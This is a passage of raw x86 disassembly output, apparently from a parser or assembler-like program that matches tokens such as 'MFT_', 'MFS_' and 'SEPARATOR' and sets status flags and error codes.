  4074fb:	c3                   	ret
  4074fc:	5a                   	pop    %edx
  4074fd:	e8 29 fd ff ff       	call   0x40722b
  407502:	e8 95 ed ff ff       	call   0x40629c
  407507:	c3                   	ret
  407508:	53                   	push   %ebx
  407509:	56                   	push   %esi
  40750a:	e8 a2 0e 00 00       	call   0x4083b1
  40750f:	0f 84 8b 00 00 00    	je     0x4075a0
  407515:	e8 c7 0e 00 00       	call   0x4083e1
  40751a:	0f 84 80 00 00 00    	je     0x4075a0
  407520:	e8 9a b7 ff ff       	call   0x402cbf
  407525:	be ec ab 40 00       	mov    $0x40abec,%esi
  40752a:	81 3e 4d 46 54 5f    	cmpl   $0x5f54464d,(%esi)
  407530:	75 0a                	jne    0x40753c
  407532:	83 c6 04             	add    $0x4,%esi
  407535:	83 eb 04             	sub    $0x4,%ebx
  407538:	76 66                	jbe    0x4075a0
  40753a:	eb 29                	jmp    0x407565
  40753c:	81 3e 4d 46 53 5f    	cmpl   $0x5f53464d,(%esi)
  407542:	74 3a                	je     0x40757e
  407544:	66 81 3e 4d 46       	cmpw   $0x464d,(%esi)
  407549:	75 0e                	jne    0x407559
  40754b:	80 7e 02 5f          	cmpb   $0x5f,0x2(%esi)
  40754f:	75 08                	jne    0x407559
  407551:	83 c6 03             	add    $0x3,%esi
  407554:	83 eb 03             	sub    $0x3,%ebx
  407557:	76 47                	jbe    0x4075a0
  407559:	b8 e4 cf 40 00       	mov    $0x40cfe4,%eax
  40755e:	e8 1b 0c 00 00       	call   0x40817e
  407563:	73 2d                	jae    0x407592
  407565:	b8 58 cf 40 00       	mov    $0x40cf58,%eax
  40756a:	e8 0f 0c 00 00       	call   0x40817e
  40756f:	72 2f                	jb     0x4075a0
  407571:	e8 3f e0 ff ff       	call   0x4055b5
  407576:	09 05 bc aa 40 00    	or     %eax,0x40aabc
  40757c:	eb 1f                	jmp    0x40759d
  40757e:	83 c6 04             	add    $0x4,%esi
  407581:	83 eb 04             	sub    $0x4,%ebx
  407584:	76 1a                	jbe    0x4075a0
  407586:	b8 e4 cf 40 00       	mov    $0x40cfe4,%eax
  40758b:	e8 ee 0b 00 00       	call   0x40817e
  407590:	72 0e                	jb     0x4075a0
  407592:	e8 1e e0 ff ff       	call   0x4055b5
  407597:	09 05 b4 aa 40 00    	or     %eax,0x40aab4
  40759d:	f8                   	clc
  40759e:	eb 01                	jmp    0x4075a1
  4075a0:	f9                   	stc
  4075a1:	5e                   	pop    %esi
  4075a2:	5b                   	pop    %ebx
  4075a3:	c3                   	ret
  4075a4:	c7 05 b4 aa 40 00 00 	movl   $0x0,0x40aab4
  4075ab:	00 00 00 
  4075ae:	c7 05 bc aa 40 00 00 	movl   $0x0,0x40aabc
  4075b5:	00 00 00 
  4075b8:	c6 05 c2 ab 40 00 00 	movb   $0x0,0x40abc2
  4075bf:	e8 9d cf ff ff       	call   0x404561
  4075c4:	e8 97 cb ff ff       	call   0x404160
  4075c9:	72 64                	jb     0x40762f
  4075cb:	e8 39 ce ff ff       	call   0x404409
  4075d0:	72 5d                	jb     0x40762f
  4075d2:	74 5b                	je     0x40762f
  4075d4:	e8 87 cb ff ff       	call   0x404160
  4075d9:	72 54                	jb     0x40762f
  4075db:	e8 23 cd ff ff       	call   0x404303
  4075e0:	72 3d                	jb     0x40761f
  4075e2:	75 11                	jne    0x4075f5
  4075e4:	e8 1f ff ff ff       	call   0x407508
  4075e9:	73 e0                	jae    0x4075cb
  4075eb:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  4075f2:	09 ff                	or     %edi,%edi
  4075f4:	c3                   	ret
  4075f5:	e8 d2 c5 ff ff       	call   0x403bcc
  4075fa:	ba 42 08 00 00       	mov    $0x842,%edx
  4075ff:	72 2e                	jb     0x40762f
  407601:	e8 78 c6 ff ff       	call   0x403c7e
  407606:	80 3d c2 ab 40 00 01 	cmpb   $0x1,0x40abc2
  40760d:	74 08                	je     0x407617
  40760f:	09 05 bc aa 40 00    	or     %eax,0x40aabc
  407615:	eb b4                	jmp    0x4075cb
  407617:	09 05 b4 aa 40 00    	or     %eax,0x40aab4
  40761d:	eb ac                	jmp    0x4075cb
  40761f:	fe 05 c2 ab 40 00    	incb   0x40abc2
  407625:	80 3d c2 ab 40 00 02 	cmpb   $0x2,0x40abc2
  40762c:	75 9d                	jne    0x4075cb
  40762e:	c3                   	ret
  40762f:	f9                   	stc
  407630:	c3                   	ret
  407631:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  407638:	ff 05 34 ab 40 00    	incl   0x40ab34
  40763e:	31 c0                	xor    %eax,%eax
  407640:	a3 2c ab 40 00       	mov    %eax,0x40ab2c
  407645:	c3                   	ret
  407646:	e8 be cd ff ff       	call   0x404409
  40764b:	72 4f                	jb     0x40769c
  40764d:	74 4b                	je     0x40769a
  40764f:	e8 af cc ff ff       	call   0x404303
  407654:	72 46                	jb     0x40769c
  407656:	75 39                	jne    0x407691
  407658:	53                   	push   %ebx
  407659:	56                   	push   %esi
  40765a:	e8 60 b6 ff ff       	call   0x402cbf
  40765f:	be ec ab 40 00       	mov    $0x40abec,%esi
  407664:	81 3e 4d 46 54 5f    	cmpl   $0x5f54464d,(%esi)
  40766a:	75 06                	jne    0x407672
  40766c:	83 c6 04             	add    $0x4,%esi
  40766f:	83 eb 04             	sub    $0x4,%ebx
  407672:	83 fb 09             	cmp    $0x9,%ebx
  407675:	75 1a                	jne    0x407691
  407677:	81 3e 53 45 50 41    	cmpl   $0x41504553,(%esi)
  40767d:	75 12                	jne    0x407691
  40767f:	81 7e 04 52 41 54 4f 	cmpl   $0x4f544152,0x4(%esi)
  407686:	75 09                	jne    0x407691
  407688:	80 7e 08 52          	cmpb   $0x52,0x8(%esi)
  40768c:	75 03                	jne    0x407691
  40768e:	5e                   	pop    %esi
  40768f:	5b                   	pop    %ebx
  407690:	c3                   	ret
  407691:	5e                   	pop    %esi
  407692:	5b                   	pop    %ebx
  407693:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  40769a:	09 f6                	or     %esi,%esi
  40769c:	c3                   	ret
  40769d:	e8 c1 d7 ff ff       	call   0x404e63
  4076a2:	72 20                	jb     0x4076c4
  4076a4:	e8 9d ff ff ff       	call   0x407646
  4076a9:	72 19                	jb     0x4076c4
  4076ab:	75 18                	jne    0x4076c5
  4076ad:	8b 35 78 aa 40 00    	mov    0x40aa78,%esi
  4076b3:	c7 06 00 08 00 00    	movl   $0x800,(%esi)
  4076b9:	83 c6 10             	add    $0x10,%esi
  4076bc:	89 35 78 aa 40 00    	mov    %esi,0x40aa78
  4076c2:	31 c0                	xor    %eax,%eax
  4076c4:	c3                   	ret
  4076c5:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  4076cb:	83 c2 0e             	add    $0xe,%edx
  4076ce:	c7 05 cc aa 40 00 7d 	movl   $0x87d,0x40aacc
  4076d5:	08 00 00 
  4076d8:	e8 d6 dd ff ff       	call   0x4054b3
  4076dd:	72 e5                	jb     0x4076c4
  4076df:	e8 7d ce ff ff       	call   0x404561
  4076e4:	c7 05 cc aa 40 00 43 	movl   $0x843,0x40aacc
  4076eb:	08 00 00 
  4076ee:	80 0d c6 ab 40 00 02 	orb    $0x2,0x40abc6
  4076f5:	80 0d c5 ab 40 00 01 	orb    $0x1,0x40abc5
  4076fc:	e8 51 cf ff ff       	call   0x404652
  407701:	72 2a                	jb     0x40772d
  407703:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  407709:	83 c2 08             	add    $0x8,%edx
  40770c:	89 02                	mov    %eax,(%edx)
  40770e:	e8 91 fe ff ff       	call   0x4075a4
  407713:	72 18                	jb     0x40772d
  407715:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  40771b:	a1 bc aa 40 00       	mov    0x40aabc,%eax
  407720:	89 02                	mov    %eax,(%edx)
  407722:	a1 b4 aa 40 00       	mov    0x40aab4,%eax
  407727:	89 42 04             	mov    %eax,0x4(%edx)
  40772a:	09 c9                	or     %ecx,%ecx
  40772c:	c3                   	ret
  40772d:	f9                   	stc
  40772e:	c3                   	ret
  40772f:	e8 2f d7 ff ff       	call   0x404e63
  407734:	0f 82 bb 00 00 00    	jb     0x4077f5
  40773a:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  407740:	83 c2 0e             	add    $0xe,%edx
  407743:	c7 05 cc aa 40 00 7d 	movl   $0x87d,0x40aacc
  40774a:	08 00 00 
  40774d:	e8 61 dd ff ff       	call   0x4054b3
  407752:	0f 82 9d 00 00 00    	jb     0x4077f5
  407758:	e8 04 ce ff ff       	call   0x404561
  40775d:	c7 05 cc aa 40 00 3e 	movl   $0x83e,0x40aacc
  407764:	08 00 00 
  407767:	80 0d c6 ab 40 00 02 	orb    $0x2,0x40abc6
  40776e:	80 0d c5 ab 40 00 01 	orb    $0x1,0x40abc5
  407775:	e8 d8 ce ff ff       	call   0x404652
  40777a:	72 79                	jb     0x4077f5
  40777c:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  407782:	83 c2 08             	add    $0x8,%edx
  407785:	89 02                	mov    %eax,(%edx)
  407787:	e8 18 fe ff ff       	call   0x4075a4
  40778c:	72 67                	jb     0x4077f5
  40778e:	75 1c                	jne    0x4077ac
  407790:	ba c0 aa 40 00       	mov    $0x40aac0,%edx
  407795:	e8 88 e0 ff ff       	call   0x405822
  40779a:	72 59                	jb     0x4077f5
  40779c:	e8 68 cc ff ff       	call   0x404409
  4077a1:	72 52                	jb     0x4077f5
  4077a3:	74 50                	je     0x4077f5
  4077a5:	e8 59 cb ff ff       	call   0x404303
  4077aa:	72 49                	jb     0x4077f5
  4077ac:	ba 70 08 00 00       	mov    $0x870,%edx
  4077b1:	e8 df 0b 00 00       	call   0x408395
  4077b6:	75 3d                	jne    0x4077f5
  4077b8:	e8 74 fe ff ff       	call   0x407631
  4077bd:	8b 35 78 aa 40 00    	mov    0x40aa78,%esi
  4077c3:	e8 60 d6 ff ff       	call   0x404e28
  4077c8:	a1 c0 aa 40 00       	mov    0x40aac0,%eax
  4077cd:	89 06                	mov    %eax,(%esi)
  4077cf:	83 c6 04             	add    $0x4,%esi
  4077d2:	89 35 78 aa 40 00    	mov    %esi,0x40aa78
  4077d8:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  4077de:	a1 bc aa 40 00       	mov    0x40aabc,%eax
  4077e3:	89 02                	mov    %eax,(%edx)
  4077e5:	a1 b4 aa 40 00       	mov    0x40aab4,%eax
  4077ea:	89 42 04             	mov    %eax,0x4(%edx)
  4077ed:	66 c7 42 0c 01 00    	movw   $0x1,0xc(%edx)
  4077f3:	f8                   	clc
  4077f4:	c3                   	ret
  4077f5:	f9                   	stc
  4077f6:	c3                   	ret
  4077f7:	80 0d c7 ab 40 00 08 	orb    $0x8,0x40abc7
  4077fe:	e8 60 d6 ff ff       	call   0x404e63
  407803:	72 1a                	jb     0x40781f
  407805:	e8 3c fe ff ff       	call   0x407646
  40780a:	72 13                	jb     0x40781f
  40780c:	75 12                	jne    0x407820
  40780e:	8b 35 78 aa 40 00    	mov    0x40aa78,%esi
  407814:	83 c6 06             	add    $0x6,%esi
  407817:	89 35 78 aa 40 00    	mov    %esi,0x40aa78
  40781d:	31 c0                	xor    %eax,%eax
  40781f:	c3                   	ret
  407820:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  407826:	83 c2 04             	add    $0x4,%edx
  407829:	c7 05 cc aa 40 00 7d 	movl   $0x87d,0x40aacc
  407830:	08 00 00 
  407833:	e8 7b dc ff ff       	call   0x4054b3
  407838:	72 e5                	jb     0x40781f
  40783a:	e8 22 cd ff ff       	call   0x404561
  40783f:	c7 05 cc aa 40 00 43 	movl   $0x843,0x40aacc
  407846:	08 00 00 
  407849:	80 0d c5 ab 40 00 01 	orb    $0x1,0x40abc5
  407850:	e8 fd cd ff ff       	call   0x404652
  407855:	72 c8                	jb     0x40781f
  407857:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  40785d:	83 c2 02             	add    $0x2,%edx
  407860:	66 89 02             	mov    %ax,(%edx)
  407863:	e8 3c fd ff ff       	call   0x4075a4
  407868:	72 17                	jb     0x407881
  40786a:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  407870:	a1 bc aa 40 00       	mov    0x40aabc,%eax
  407875:	03 05 b4 aa 40 00    	add    0x40aab4,%eax
  40787b:	66 89 02             	mov    %ax,(%edx)
  40787e:	09 c9                	or     %ecx,%ecx
  407880:	c3                   	ret
  407881:	f9                   	stc
  407882:	c3                   	ret
  407883:	80 0d c7 ab 40 00 08 	orb    $0x8,0x40abc7
  40788a:	e8 d4 d5 ff ff       	call   0x404e63
  40788f:	72 50                	jb     0x4078e1
  407891:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  407897:	83 c2 02             	add    $0x2,%edx
  40789a:	c7 05 cc aa 40 00 7d 	movl   $0x87d,0x40aacc
  4078a1:	08 00 00 
  4078a4:	e8 0a dc ff ff       	call   0x4054b3
  4078a9:	72 36                	jb     0x4078e1
  4078ab:	e8 b1 cc ff ff       	call   0x404561
  4078b0:	e8 ef fc ff ff       	call   0x4075a4
  4078b5:	72 2a                	jb     0x4078e1
  4078b7:	ba 70 08 00 00       	mov    $0x870,%edx
  4078bc:	e8 d4 0a 00 00       	call   0x408395
  4078c1:	75 1e                	jne    0x4078e1
  4078c3:	e8 69 fd ff ff       	call   0x407631
  4078c8:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  4078ce:	a1 bc aa 40 00       	mov    0x40aabc,%eax
  4078d3:	03 05 b4 aa 40 00    	add    0x40aab4,%eax
  4078d9:	83 c0 10             	add    $0x10,%eax
  4078dc:	66 89 02             	mov    %ax,(%edx)
  4078df:	f8                   	clc
  4078e0:	c3                   	ret
  4078e1:	f9                   	stc
  4078e2:	c3                   	ret
  4078e3:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  4078ea:	74 06                	je     0x4078f2
  4078ec:	e8 3e fe ff ff       	call   0x40772f
  4078f1:	c3                   	ret
  4078f2:	e8 8c ff ff ff       	call   0x407883
  4078f7:	c3                   	ret
  4078f8:	ff 05 2c ab 40 00    	incl   0x40ab2c
  4078fe:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  407905:	74 06                	je     0x40790d
  407907:	e8 91 fd ff ff       	call   0x40769d
  40790c:	c3                   	ret
  40790d:	e8 e5 fe ff ff       	call   0x4077f7
  407912:	c3                   	ret
  407913:	09 f6                	or     %esi,%esi
  407915:	74 11                	je     0x407928
  407917:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  40791e:	74 03                	je     0x407923
  407920:	83 c6 0c             	add    $0xc,%esi
  407923:	66 81 0e 80 00       	orw    $0x80,(%esi)
  407928:	c3                   	ret
  407929:	ba 44 18 00 00       	mov    $0x1844,%edx
  40792e:	83 3d 2c ab 40 00 00 	cmpl   $0x0,0x40ab2c
  407935:	74 2a                	je     0x407961
  407937:	8b 35 dc aa 40 00    	mov    0x40aadc,%esi
  40793d:	c7 05 dc aa 40 00 00 	movl   $0x0,0x40aadc
  407944:	00 00 00 
  407947:	e8 c7 ff ff ff       	call   0x407913
  40794c:	75 0b                	jne    0x407959
  40794e:	8b 35 e0 aa 40 00    	mov    0x40aae0,%esi
  407954:	e8 ba ff ff ff       	call   0x407913
  407959:	ff 0d 34 ab 40 00    	decl   0x40ab34
  40795f:	f8                   	clc
  407960:	c3                   	ret
  407961:	f9                   	stc
  407962:	c3                   	ret
  407963:	8f 05 3c ab 40 00    	pop    0x40ab3c
  407969:	89 25 38 ab 40 00    	mov    %esp,0x40ab38
  40796f:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  407976:	74 49                	je     0x4079c1
  407978:	c7 05 c0 aa 40 00 00 	movl   $0x0,0x40aac0
  40797f:	00 00 00 
  407982:	e8 82 ca ff ff       	call   0x404409
  407987:	72 36                	jb     0x4079bf
  407989:	74 34                	je     0x4079bf
  40798b:	e8 73 c9 ff ff       	call   0x404303
  407990:	72 17                	jb     0x4079a9
  407992:	ba 4a 08 00 04       	mov    $0x400084a,%edx
  407997:	75 07                	jne    0x4079a0
  407999:	e8 38 d2 ff ff       	call   0x404bd6
  40799e:	73 e2                	jae    0x407982
  4079a0:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  4079a7:	eb 05                	jmp    0x4079ae
  4079a9:	e8 b3 cb ff ff       	call   0x404561
  4079ae:	ba c0 aa 40 00       	mov    $0x40aac0,%edx
  4079b3:	e8 6a de ff ff       	call   0x405822
  4079b8:	e8 06 f3 ff ff       	call   0x406cc3
  4079bd:	73 09                	jae    0x4079c8
  4079bf:	eb 7a                	jmp    0x407a3b
  4079c1:	e8 38 f3 ff ff       	call   0x406cfe
  4079c6:	72 73                	jb     0x407a3b
  4079c8:	ba 00 08 00 00       	mov    $0x800,%edx
  4079cd:	e8 68 d4 ff ff       	call   0x404e3a
  4079d2:	72 67                	jb     0x407a3b
  4079d4:	8b 1d 78 aa 40 00    	mov    0x40aa78,%ebx
  4079da:	83 c3 04             	add    $0x4,%ebx
  4079dd:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  4079e4:	74 11                	je     0x4079f7
  4079e6:	c7 43 fc 01 00 04 00 	movl   $0x40001,-0x4(%ebx)
  4079ed:	a1 c0 aa 40 00       	mov    0x40aac0,%eax
  4079f2:	89 03                	mov    %eax,(%ebx)
  4079f4:	83 c3 04             	add    $0x4,%ebx
  4079f7:	89 1d 78 aa 40 00    	mov    %ebx,0x40aa78
  4079fd:	31 c0                	xor    %eax,%eax
  4079ff:	a3 2c ab 40 00       	mov    %eax,0x40ab2c
  407a04:	a3 e0 aa 40 00       	mov    %eax,0x40aae0
  407a09:	a3 dc aa 40 00       	mov    %eax,0x40aadc
  407a0e:	a3 34 ab 40 00       	mov    %eax,0x40ab34
  407a13:	e8 f1 c9 ff ff       	call   0x404409
  407a18:	72 21                	jb     0x407a3b
  407a1a:	74 1f                	je     0x407a3b
  407a1c:	e8 e2 c8 ff ff       	call   0x404303
  407a21:	72 18                	jb     0x407a3b
  407a23:	e8 89 09 00 00       	call   0x4083b1
  407a28:	75 14                	jne    0x407a3e
  407a2a:	e8 fa fe ff ff       	call   0x407929
  407a2f:	72 0a                	jb     0x407a3b
  407a31:	78 36                	js     0x407a69
  407a33:	8f 05 e0 aa 40 00    	pop    0x40aae0
  407a39:	eb d8                	jmp    0x407a13
  407a3b:	f9                   	stc
  407a3c:	eb 30                	jmp    0x407a6e
  407a3e:	e8 89 09 00 00       	call   0x4083cc
  407a43:	75 09                	jne    0x407a4e
  407a45:	e8 ae fe ff ff       	call   0x4078f8
  407a4a:	72 22                	jb     0x407a6e
  407a4c:	eb c5                	jmp    0x407a13
  407a4e:	e8 8e 09 00 00       	call   0x4083e1
  407a53:	ba 45 28 00 00       	mov    $0x2845,%edx
  407a58:	75 e1                	jne    0x407a3b
  407a5a:	e8 84 fe ff ff       	call   0x4078e3
  407a5f:	ff 35 dc aa 40 00    	push   0x40aadc
  407a65:	72 07                	jb     0x407a6e
  407a67:	eb aa                	jmp    0x407a13
  407a69:	e8 2e e8 ff ff       	call   0x40629c
  407a6e:	8b 25 38 ab 40 00    	mov    0x40ab38,%esp
  407a74:	ff 35 3c ab 40 00    	push   0x40ab3c
  407a7a:	c3                   	ret
  407a7b:	c7 05 cc aa 40 00 46 	movl   $0x846,0x40aacc
  407a82:	08 00 00 
  407a85:	8b 35 78 aa 40 00    	mov    0x40aa78,%esi
  407a8b:	e8 3c f1 ff ff       	call   0x406bcc
  407a90:	72 26                	jb     0x407ab8
  407a92:	75 f7                	jne    0x407a8b
  407a94:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  407a99:	29 f0                	sub    %esi,%eax
  407a9b:	66 89 46 fe          	mov    %ax,-0x2(%esi)
  407a9f:	e8 65 c9 ff ff       	call   0x404409
  407aa4:	72 12                	jb     0x407ab8
  407aa6:	74 10                	je     0x407ab8
  407aa8:	e8 56 c8 ff ff       	call   0x404303
  407aad:	72 09                	jb     0x407ab8
  407aaf:	ba 4e 28 00 00       	mov    $0x284e,%edx
  407ab4:	75 02                	jne    0x407ab8
  407ab6:	f8                   	clc
  407ab7:	c3                   	ret
  407ab8:	f9                   	stc
  407ab9:	c3                   	ret
  407aba:	f9                   	stc
  407abb:	c3                   	ret
  407abc:	e8 e9 e8 ff ff       	call   0x4063aa
  407ac1:	e8 43 c9 ff ff       	call   0x404409
  407ac6:	72 f2                	jb     0x407aba
  407ac8:	74 f0                	je     0x407aba
  407aca:	e8 34 c8 ff ff       	call   0x404303
  407acf:	72 e9                	jb     0x407aba
  407ad1:	75 0e                	jne    0x407ae1
  407ad3:	e8 fe d0 ff ff       	call   0x404bd6
  407ad8:	73 e7                	jae    0x407ac1
  407ada:	ba 80 08 00 00       	mov    $0x880,%edx
  407adf:	eb d9                	jmp    0x407aba
  407ae1:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  407ae8:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  407aed:	83 c2 12             	add    $0x12,%edx
  407af0:	e8 61 d2 ff ff       	call   0x404d56
  407af5:	72 c3                	jb     0x407aba
  407af7:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  407afe:	74 1d                	je     0x407b1d
  407b00:	e8 5c ca ff ff       	call   0x404561
  407b05:	72 16                	jb     0x407b1d
  407b07:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  407b0c:	83 c2 04             	add    $0x4,%edx
  407b0f:	e8 0e dd ff ff       	call   0x405822
  407b14:	72 a4                	jb     0x407aba
  407b16:	e8 72 dd ff ff       	call   0x40588d
  407b1b:	72 9d                	jb     0x407aba
  407b1d:	e8 a1 f1 ff ff       	call   0x406cc3
  407b22:	72 96                	jb     0x407aba
  407b24:	ba 00 08 00 00       	mov    $0x800,%edx
  407b29:	e8 0c d3 ff ff       	call   0x404e3a
  407b2e:	72 8a                	jb     0x407aba
  407b30:	e8 7b e7 ff ff       	call   0x4062b0
  407b35:	72 83                	jb     0x407aba
  407b37:	e8 cd c8 ff ff       	call   0x404409
  407b3c:	72 60                	jb     0x407b9e
  407b3e:	74 5e                	je     0x407b9e
  407b40:	e8 be c7 ff ff       	call   0x404303
  407b45:	72 57                	jb     0x407b9e
  407b47:	ba 4e 28 00 00       	mov    $0x284e,%edx
  407b4c:	75 50                	jne    0x407b9e
  407b4e:	e8 42 08 00 00       	call   0x408395
  407b53:	75 07                	jne    0x407b5c
  407b55:	e8 21 ff ff ff       	call   0x407a7b
  407b5a:	72 42                	jb     0x407b9e
  407b5c:	e8 50 08 00 00       	call   0x4083b1
  407b61:	74 46                	je     0x407ba9
  407b63:	66 ff 05 76 ab 40 00 	incw   0x40ab76
  407b6a:	e8 6f e2 ff ff       	call   0x405dde
  407b6f:	72 2d                	jb     0x407b9e
  407b71:	74 1b                	je     0x407b8e
  407b73:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  407b7a:	75 09                	jne    0x407b85
  407b7c:	e8 a8 de ff ff       	call   0x405a29
  407b81:	72 1b                	jb     0x407b9e
  407b83:	eb b2                	jmp    0x407b37
  407b85:	e8 8b df ff ff       	call   0x405b15
  407b8a:	72 12                	jb     0x407b9e
  407b8c:	eb a9                	jmp    0x407b37
  407b8e:	f6 05 c7 ab 40 00 20 	testb  $0x20,0x40abc7
  407b95:	75 09                	jne    0x407ba0
  407b97:	e8 87 e0 ff ff       	call   0x405c23
  407b9c:	73 99                	jae    0x407b37
  407b9e:	f9                   	stc
  407b9f:	c3                   	ret
  407ba0:	e8 41 e1 ff ff       	call   0x405ce6
  407ba5:	72 f7                	jb     0x407b9e
  407ba7:	eb 8e                	jmp    0x407b37
  407ba9:	8b 15 ec aa 40 00    	mov    0x40aaec,%edx
  407baf:	66 a1 76 ab 40 00    	mov    0x40ab76,%ax
  407bb5:	66 89 02             	mov    %ax,(%edx)
  407bb8:	e8 df e6 ff ff       	call   0x40629c
  407bbd:	c3                   	ret
  407bbe:	e8 46 c8 ff ff       	call   0x404409
  407bc3:	72 72                	jb     0x407c37
  407bc5:	e8 39 c7 ff ff       	call   0x404303
  407bca:	72 6b                	jb     0x407c37
  407bcc:	75 2a                	jne    0x407bf8
  407bce:	e8 03 d0 ff ff       	call   0x404bd6
  407bd3:	73 e9                	jae    0x407bbe
  407bd5:	e8 bb 07 00 00       	call   0x408395
  407bda:	74 5d                	je     0x407c39
  407bdc:	66 a1 78 ab 40 00    	mov    0x40ab78,%ax
  407be2:	e8 9c 06 00 00       	call   0x408283
  407be7:	72 0f                	jb     0x407bf8
  407be9:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  407bf0:	e8 ce f0 ff ff       	call   0x406cc3
  407bf5:	73 42                	jae    0x407c39
  407bf7:	c3                   	ret
  407bf8:	e8 8f ea ff ff       	call   0x40668c
  407bfd:	72 33                	jb     0x407c32
  407bff:	e8 d9 eb ff ff       	call   0x4067dd
  407c04:	72 2c                	jb     0x407c32
  407c06:	89 da                	mov    %ebx,%edx
  407c08:	81 c2 00 02 00 00    	add    $0x200,%edx
  407c0e:	e8 27 d2 ff ff       	call   0x404e3a
  407c13:	72 1d                	jb     0x407c32
  407c15:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  407c1a:	e8 7a ec ff ff       	call   0x406899
  407c1f:	72 11                	jb     0x407c32
  407c21:	01 1d 78 aa 40 00    	add    %ebx,0x40aa78
  407c27:	e8 34 ea ff ff       	call   0x406660
  407c2c:	e8 6b e6 ff ff       	call   0x40629c
  407c31:	c3                   	ret
  407c32:	e8 29 ea ff ff       	call   0x406660
  407c37:	f9                   	stc
  407c38:	c3                   	ret
  407c39:	ba 00 08 00 00       	mov    $0x800,%edx
  407c3e:	e8 f7 d1 ff ff       	call   0x404e3a
  407c43:	72 18                	jb     0x407c5d
  407c45:	c7 05 cc aa 40 00 47 	movl   $0x847,0x40aacc
  407c4c:	08 00 00 
  407c4f:	e8 78 ef ff ff       	call   0x406bcc
  407c54:	72 07                	jb     0x407c5d
  407c56:	75 f7                	jne    0x407c4f
  407c58:	e8 3f e6 ff ff       	call   0x40629c
  407c5d:	c3                   	ret
  407c5e:	a1 0c ab 40 00       	mov    0x40ab0c,%eax
  407c63:	a3 04 ab 40 00       	mov    %eax,0x40ab04
  407c68:	89 3d 08 ab 40 00    	mov    %edi,0x40ab08
  407c6e:	89 3d 1c ab 40 00    	mov    %edi,0x40ab1c
  407c74:	89 0d 20 ab 40 00    	mov    %ecx,0x40ab20
  407c7a:	80 25 c6 ab 40 00 3f 	andb   $0x3f,0x40abc6
  407c81:	c7 05 68 ab 40 00 00 	movl   $0x0,0x40ab68
  407c88:	00 00 00 
  407c8b:	66 c7 05 74 ab 40 00 	movw   $0x0,0x40ab74
  407c92:	00 00 
  407c94:	66 c7 05 78 ab 40 00 	movw   $0x0,0x40ab78
  407c9b:	00 00 
  407c9d:	80 25 c7 ab 40 00 df 	andb   $0xdf,0x40abc7
  407ca4:	e8 60 c7 ff ff       	call   0x404409
  407ca9:	72 29                	jb     0x407cd4
  407cab:	74 2e                	je     0x407cdb
  407cad:	a1 0c ab 40 00       	mov    0x40ab0c,%eax
  407cb2:	a3 04 ab 40 00       	mov    %eax,0x40ab04
  407cb7:	89 3d 08 ab 40 00    	mov    %edi,0x40ab08
  407cbd:	89 3d 1c ab 40 00    	mov    %edi,0x40ab1c
  407cc3:	89 0d 20 ab 40 00    	mov    %ecx,0x40ab20
  407cc9:	e8 35 c6 ff ff       	call   0x404303
  407cce:	72 0b                	jb     0x407cdb
  407cd0:	75 30                	jne    0x407d02
  407cd2:	eb 0b                	jmp    0x407cdf
  407cd4:	80 fa 24             	cmp    $0x24,%dl
  407cd7:	74 02                	je     0x407cdb
  407cd9:	e3 02                	jecxz  0x407cdd
  407cdb:	f9                   	stc
  407cdc:	c3                   	ret
  407cdd:	f8                   	clc
  407cde:	c3                   	ret
  407cdf:	e8 22 05 00 00       	call   0x408206
  407ce4:	72 1c                	jb     0x407d02
  407ce6:	3c 00                	cmp    $0x0,%al
  407ce8:	75 0e                	jne    0x407cf8
  407cea:	e8 bb d1 ff ff       	call   0x404eaa
  407cef:	72 ea                	jb     0x407cdb
  407cf1:	66 a3 7a ab 40 00    	mov    %ax,0x40ab7a
  407cf7:	c3                   	ret
  407cf8:	3c 06                	cmp    $0x6,%al
  407cfa:	75 06                	jne    0x407d02
  407cfc:	e8 2a f0 ff ff       	call   0x406d2b
  407d01:	c3                   	ret
  407d02:	c7 05 cc aa 40 00 69 	movl   $0x869,0x40aacc
  407d09:	08 00 00 
  407d0c:	80 0d c6 ab 40 00 08 	orb    $0x8,0x40abc6
  407d13:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  407d1a:	e8 33 c9 ff ff       	call   0x404652
  407d1f:	72 ba                	jb     0x407cdb
  407d21:	83 3d 60 ab 40 00 00 	cmpl   $0x0,0x40ab60
  407d28:	75 05                	jne    0x407d2f
  407d2a:	a3 50 ab 40 00       	mov    %eax,0x40ab50
  407d2f:	c7 05 5c ab 40 00 00 	movl   $0x0,0x40ab5c
  407d36:	00 00 00 
  407d39:	e8 cb c6 ff ff       	call   0x404409
  407d3e:	72 9b                	jb     0x407cdb
  407d40:	ba 5f 08 00 04       	mov    $0x400085f,%edx
  407d45:	74 94                	je     0x407cdb
  407d47:	e8 b7 c5 ff ff       	call   0x404303
  407d4c:	72 8d                	jb     0x407cdb
  407d4e:	74 39                	je     0x407d89
  407d50:	e8 77 be ff ff       	call   0x403bcc
  407d55:	ba 5c 08 00 00       	mov    $0x85c,%edx
